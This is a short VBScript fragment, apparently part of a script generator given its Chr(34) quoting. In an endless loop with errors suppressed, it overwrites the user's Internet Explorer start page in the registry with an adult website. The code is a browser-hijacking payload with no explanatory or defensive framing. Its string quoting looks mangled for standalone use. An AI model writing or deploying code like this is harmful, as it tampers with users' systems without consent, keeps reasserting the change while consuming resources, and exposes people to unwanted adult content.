On Error Resume Next
Do
Set regedit = CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")
regedit.RegWrite "&Chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&", "&Chr(34)&"http://www.sesso.com"&Chr(34)
Loop